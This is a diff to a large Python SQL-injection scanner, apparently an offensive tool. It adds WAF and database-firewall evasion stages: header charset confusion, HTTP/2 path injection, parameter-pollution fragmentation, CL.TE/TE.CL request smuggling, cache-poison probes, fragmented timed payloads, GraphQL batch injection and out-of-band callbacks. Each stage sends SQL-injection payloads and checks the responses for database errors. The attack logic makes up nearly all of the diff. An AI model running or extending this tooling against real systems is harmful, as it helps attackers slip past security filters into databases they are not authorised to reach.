@@ -85600,6 +85600,7 @@ class NovelWAFBypass:
             sel_match = re.search(r'\(SELECT[^)]+\)', payload, re.I)
             wrap_target = sel_match.group(0) if sel_match else payload
             variants.append(cls.deep_subquery(wrap_target, depth=2))
+            variants.append(cls.ansi_mode_payload(payload))
 
         if level >= 3:
             variants.append(cls.nul_padded(payload))
@@ -105177,6 +105178,9 @@ class ScannerV11(ScannerV10):
                 db_fw_bypasses = await self.db_fw_evasion.find_evasion(
                     first_ep.method, first_ep.url, data, _v11_first_fmt, fp_, fv_,
                     tamper_chain, base_bl, waf_info.get("name",""))
+                _best_dbfw = self.db_fw_evasion.get_best(db_fw_bypasses)
+                if _best_dbfw:
+                    LOG.debug("[DBFirewall] best evasion payload: %s", _best_dbfw[:120])
             except Exception as _sqr_e:
                 LOG.debug("Suppressed: %s", _sqr_e)
 
@@ -110296,6 +110300,9 @@ class ScannerV12(ScannerV11):
                 db_fw_bypasses = await self.db_fw_evasion.find_evasion(
                     first_ep.method, first_ep.url, data, _fw_fmt, fp_, fv_,
                     tamper_chain, base_bl, waf_name_)
+                _best_dbfw2 = self.db_fw_evasion.get_best(db_fw_bypasses)
+                if _best_dbfw2:
+                    LOG.debug("[DBFirewall] best evasion payload: %s", _best_dbfw2[:120])
             except Exception as _sqr_e:
                 LOG.debug("Suppressed: %s", _sqr_e)
 
@@ -132707,6 +132714,12 @@ class TechniqueCascadeEngine:
         if tech in ("B", "E", "T", "S", "U", "TH", "HQ", "EH", "BH", "BT", "IN", "UE", "ST", "NV", "WB", "EX", "HY") and templates:  # BUG-FIX-11: expanded
             try:
                 _ws_hdrs = WSUpgradeBypass.build_upgrade_headers(url)
+                try:
+                    _ws_frame_bytes = WSUpgradeBypass.build_ws_frame(templates[0])
+                    _ws_hdrs["X-WS-Frame-Size"] = str(len(_ws_frame_bytes))
+                    LOG.debug("[WS-frame] built frame: %d bytes", len(_ws_frame_bytes))
+                except Exception:
+                    pass
                 _ws_fp = await _send_injected(self.engine, method, url, data,
                     data_fmt, param, original + templates[0], self.tamper_chain,
                     extra_headers=_ws_hdrs)
@@ -132777,6 +132790,17 @@ class TechniqueCascadeEngine:
                 _garbage_payload = templates[0]
                 _garbage_hdrs = GarbageDataBypass.pad_headers(
                     {}, n_headers=12, header_size=1000)  # ~12KB total, within httpx 16KB limit
+                # Build URL-query-padded and body-padded variants for deep WAF buffer exhaustion
+                try:
+                    _pad_url = GarbageDataBypass.pad_url_query(url, param, _garbage_payload)
+                    LOG.debug("[Garbage] URL-padded probe URL len=%d", len(_pad_url))
+                except Exception:
+                    _pad_url = None
+                try:
+                    _pad_body_str = GarbageDataBypass.pad_body(param, _garbage_payload)
+                    LOG.debug("[Garbage] body-padded probe body len=%d", len(_pad_body_str))
+                except Exception:
+                    _pad_body_str = None
                 _gfp = await _send_injected(self.engine, method, url, data,
                     data_fmt, param, original + _garbage_payload,
                     self.tamper_chain, extra_headers=_garbage_hdrs)
@@ -132830,7 +132854,254 @@ class TechniqueCascadeEngine:
             except Exception:
                 pass
 
-        #  v22: Host Header Injection surface 
+        #  vX: Novel WAF bypass — charset/CT-mismatch/mutated-header probes
+        if tech in ("B", "E", "T", "S", "U", "TH", "HQ", "EH", "BH", "BT", "IN", "UE", "ST", "NV", "WB", "EX", "HY") and templates:
+            try:
+                _novel_hdr_variants = [
+                    ("charset_confusion", NovelWAFBypass.charset_confusion_headers(templates[0])),
+                    ("ct_mismatch", NovelWAFBypass.ct_mismatch_headers(data_fmt)),
+                    ("mutate_headers", NovelWAFBypass.mutate_headers({
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Accept": "text/html,application/xhtml+xml",
+                    })),
+                ]
+                for _nhdr_name, _nhdr in _novel_hdr_variants:
+                    _nfp = await _send_injected(self.engine, method, url, data,
+                        data_fmt, param, original + templates[0], self.tamper_chain,
+                        extra_headers=_nhdr)
+                    self._total_reqs += 1
+                    if _nfp and not WAFBlockDiscriminator.single_waf_blocked(_nfp):
+                        _nbody = _safe_decode_body(_nfp, encoding="utf-8", errors="replace",
+                            func_name="novel_hdr")
+                        for _nhep, _nhpats in SQL_ERROR_PATTERNS.items():
+                            for _nhp in _nhpats:
+                                if re.search(_nhp, _nbody, re.I):
+                                    _nhdet = DetectionResult(
+                                        param=param, technique="E",
+                                        payload=templates[0], dbms=_nhep,
+                                        confidence=0.75,
+                                        notes=f"novel_hdr_bypass={_nhdr_name}")
+                                    try:
+                                        _nhdet.exact_sent_payload = DetectionResult.compute_exact_payload(
+                                            original + templates[0], self.tamper_chain)
+                                    except Exception:
+                                        pass
+                                    return _nhdet
+            except Exception:
+                pass
+
+        #  vX: Novel WAF bypass — HTTP/2 pseudo-header (:path) injection
+        if tech in ("B", "E", "T", "S", "U") and templates:
+            try:
+                from urllib.parse import urlparse, urlunparse
+                _h2_parsed = urlparse(url)
+                _h2_path = NovelWAFBypass.h2_path_injection(
+                    _h2_parsed.path or "/", templates[0])
+                _h2_url = urlunparse(_h2_parsed._replace(path=_h2_path))
+                _h2fp = await _send_injected(self.engine, method, _h2_url, data,
+                    data_fmt, param, original + templates[0], self.tamper_chain)
+                self._total_reqs += 1
+                if _h2fp and not WAFBlockDiscriminator.single_waf_blocked(_h2fp):
+                    _h2body = _safe_decode_body(_h2fp, encoding="utf-8", errors="replace",
+                        func_name="h2_path")
+                    for _h2ep, _h2pats in SQL_ERROR_PATTERNS.items():
+                        for _h2p in _h2pats:
+                            if re.search(_h2p, _h2body, re.I):
+                                _h2det = DetectionResult(
+                                    param=param, technique="E",
+                                    payload=templates[0], dbms=_h2ep,
+                                    confidence=0.72,
+                                    notes="h2_path_injection_bypass")
+                                try:
+                                    _h2det.exact_sent_payload = DetectionResult.compute_exact_payload(
+                                        original + templates[0], self.tamper_chain)
+                                except Exception:
+                                    pass
+                                return _h2det
+            except Exception:
+                pass
+
+        #  vX: Novel WAF bypass — HPP fragment across params (GET only)
+        if tech in ("B", "E") and templates and method.upper() == "GET":
+            try:
+                from urllib.parse import urlencode, urlparse
+                _frag_pairs = NovelWAFBypass.fragment_across_params(param, templates[0])
+                _frag_qs = urlencode(_frag_pairs)
+                _frag_p = urlparse(url)
+                _frag_url = f"{_frag_p.scheme}://{_frag_p.netloc}{_frag_p.path}?{_frag_qs}"
+                _ffp = await _send_injected(self.engine, "GET", _frag_url, None,
+                    data_fmt, param, original, self.tamper_chain)
+                self._total_reqs += 1
+                if _ffp and not WAFBlockDiscriminator.single_waf_blocked(_ffp):
+                    _fbody = _safe_decode_body(_ffp, encoding="utf-8", errors="replace",
+                        func_name="frag_hpp")
+                    for _fep, _fpats in SQL_ERROR_PATTERNS.items():
+                        for _fhp in _fpats:
+                            if re.search(_fhp, _fbody, re.I):
+                                _fdet = DetectionResult(
+                                    param=param, technique="E",
+                                    payload=templates[0], dbms=_fep,
+                                    confidence=0.70,
+                                    notes="hpp_fragment_bypass")
+                                try:
+                                    _fdet.exact_sent_payload = DetectionResult.compute_exact_payload(
+                                        original + templates[0], self.tamper_chain)
+                                except Exception:
+                                    pass
+                                return _fdet
+            except Exception:
+                pass
+
+        #  vX: Request Smuggling v2 bypass — CL.TE + TE.CL
+        if tech in ("B", "E", "T") and templates and method.upper() == "POST":
+            try:
+                _smug_host = url.split("/")[2] if "/" in url[8:] else ""
+                _smug_clte_raw, _smug_clte_hdrs = self._smuggling_v2.build_clte_smuggle(
+                    templates[0], param, _smug_host)
+                _smug_tecl_raw, _smug_tecl_hdrs = self._smuggling_v2.build_tecl_smuggle(
+                    templates[0], param, _smug_host)
+                for _smug_label, _smug_raw, _smug_hdrs in (
+                    ("clte", _smug_clte_raw, _smug_clte_hdrs),
+                    ("tecl", _smug_tecl_raw, _smug_tecl_hdrs),
+                ):
+                    _smug_data = _smug_raw.decode("utf-8", errors="replace")
+                    _smug_fp = await _send_injected(self.engine, method, url,
+                        _smug_data, data_fmt, param, original, self.tamper_chain,
+                        extra_headers=_smug_hdrs)
+                    self._total_reqs += 1
+                    if _smug_fp and not WAFBlockDiscriminator.single_waf_blocked(_smug_fp):
+                        _smug_resp = _safe_decode_body(_smug_fp, encoding="utf-8",
+                            errors="replace", func_name="smuggling")
+                        for _sep, _spats in SQL_ERROR_PATTERNS.items():
+                            for _sp in _spats:
+                                if re.search(_sp, _smug_resp, re.I):
+                                    _smug_det = DetectionResult(
+                                        param=param, technique="E",
+                                        payload=templates[0], dbms=_sep,
+                                        confidence=0.73,
+                                        notes=f"request_smuggling_{_smug_label}_bypass")
+                                    try:
+                                        _smug_det.exact_sent_payload = DetectionResult.compute_exact_payload(
+                                            original + templates[0], self.tamper_chain)
+                                    except Exception:
+                                        pass
+                                    return _smug_det
+            except Exception:
+                pass
+
+        #  vX: Cache Poison bypass probes
+        if tech in ("B", "E") and templates:
+            try:
+                _cp_variants = self._cache_poison.build_poison_request(url, templates[0], param)
+                for _cpv in _cp_variants[:3]:
+                    _cp_url = _cpv.get("url", url)
+                    _cp_hdrs = _cpv.get("headers", {})
+                    _cpfp = await _send_injected(self.engine, method, _cp_url, data,
+                        data_fmt, param, original + templates[0], self.tamper_chain,
+                        extra_headers=_cp_hdrs)
+                    self._total_reqs += 1
+                    if _cpfp and not WAFBlockDiscriminator.single_waf_blocked(_cpfp):
+                        _cpbody = _safe_decode_body(_cpfp, encoding="utf-8",
+                            errors="replace", func_name="cache_poison")
+                        for _cpep, _cppats in SQL_ERROR_PATTERNS.items():
+                            for _cpp in _cppats:
+                                if re.search(_cpp, _cpbody, re.I):
+                                    _cp_det = DetectionResult(
+                                        param=param, technique="E",
+                                        payload=templates[0], dbms=_cpep,
+                                        confidence=0.71,
+                                        notes=f"cache_poison_bypass via {_cpv.get('notes','')}")
+                                    try:
+                                        _cp_det.exact_sent_payload = DetectionResult.compute_exact_payload(
+                                            original + templates[0], self.tamper_chain)
+                                    except Exception:
+                                        pass
+                                    return _cp_det
+            except Exception:
+                pass
+
+        #  vX: Timed Payload Assembly — fragment injection
+        if tech in ("B", "T") and templates:
+            try:
+                _ta_frags = self._timed_assembly.fragment_payload(templates[0], n_fragments=3)
+                _ta_sqls = TimedPayloadAssembly.build_session_assembly_sql(_ta_frags, dbms)
+                for _tasql in _ta_sqls[:2]:
+                    _tafp = await _send_injected(self.engine, method, url, data,
+                        data_fmt, param, original + "' AND " + _tasql + "-- -",
+                        self.tamper_chain)
+                    self._total_reqs += 1
+                    if _tafp and not WAFBlockDiscriminator.single_waf_blocked(_tafp):
+                        _tabody = _safe_decode_body(_tafp, encoding="utf-8",
+                            errors="replace", func_name="timed_assembly")
+                        for _taep, _tapats in SQL_ERROR_PATTERNS.items():
+                            for _tap in _tapats:
+                                if re.search(_tap, _tabody, re.I):
+                                    _tadet = DetectionResult(
+                                        param=param, technique="E",
+                                        payload=_tasql, dbms=_taep,
+                                        confidence=0.68,
+                                        notes="timed_payload_assembly_bypass")
+                                    try:
+                                        _tadet.exact_sent_payload = DetectionResult.compute_exact_payload(
+                                            original + _tasql, self.tamper_chain)
+                                    except Exception:
+                                        pass
+                                    return _tadet
+            except Exception:
+                pass
+
+        #  vX: GraphQL Batch/Alias Injection (JSON endpoints)
+        if tech in ("B", "E") and templates and data_fmt == "json":
+            try:
+                _gql_introspect = self._graphql_batch.build_introspection_injection(templates[0])
+                _gql_alias_q = self._graphql_batch.build_alias_query(param, templates[:3])
+                _gql_batch_req = self._graphql_batch.build_batch_request([_gql_alias_q])
+                LOG.debug("[GraphQL-batch] batch ops=%d", len(_gql_batch_req))
+                _gqlfp = await _send_injected(self.engine, method, url, _gql_introspect,
+                    "json", param, original, self.tamper_chain)
+                self._total_reqs += 1
+                if _gqlfp and not WAFBlockDiscriminator.single_waf_blocked(_gqlfp):
+                    _gqlbody = _safe_decode_body(_gqlfp, encoding="utf-8",
+                        errors="replace", func_name="graphql_batch")
+                    for _gqep, _gqpats in SQL_ERROR_PATTERNS.items():
+                        for _gqp in _gqpats:
+                            if re.search(_gqp, _gqlbody, re.I):
+                                _gqdet = DetectionResult(
+                                    param=param, technique="E",
+                                    payload=templates[0], dbms=_gqep,
+                                    confidence=0.70,
+                                    notes="graphql_batch_injection_bypass")
+                                try:
+                                    _gqdet.exact_sent_payload = DetectionResult.compute_exact_payload(
+                                        original + templates[0], self.tamper_chain)
+                                except Exception:
+                                    pass
+                                return _gqdet
+            except Exception:
+                pass
+
+        #  vX: Unified OOB Verifier — DNS/HTTP/SMB callback
+        if self._oob_verifier and tech in ("B", "T") and templates:
+            try:
+                _oob_expr = "(SELECT 1)"
+                _oob_chan_payloads = self._oob_verifier.build_payloads(_oob_expr, dbms)
+                for _oob_chan, _oob_sql in _oob_chan_payloads[:2]:
+                    _oob_full_pl = original + f"' AND ({_oob_sql})-- -"
+                    _oobfp = await _send_injected(self.engine, method, url, data,
+                        data_fmt, param, _oob_full_pl, self.tamper_chain)
+                    self._total_reqs += 1
+                    LOG.debug("[OOB-verify] channel=%s status=%s",
+                        _oob_chan, _get_safe_status_code(_oobfp))
+            except Exception:
+                pass
+
+        #  vX: Mutation Coverage Tracking — record bypass probe coverage
+        try:
+            self._coverage_tracker.record(param, tech, encoding="plain", bypass="novel_waf")
+        except Exception:
+            pass
+
+        #  v22: Host Header Injection surface
         if tech in ("B", "E"):
             try:
                 _host = url.split("/")[2] if "/" in url[8:] else ""
@@ -132893,7 +133164,7 @@ class TechniqueCascadeEngine:
         # Determines WAF normalization depth for future bypass selection
         if not getattr(self, "_deobf_detected", False):
             try:
-                _deobf = PayloadDeobfuscationDetector()
+                _deobf = self._deobf_detector
                 async def _deobf_probe(token):
                     _dfp = await _send_injected(self.engine, method, url, data,
                         data_fmt, param, original + token, self.tamper_chain)
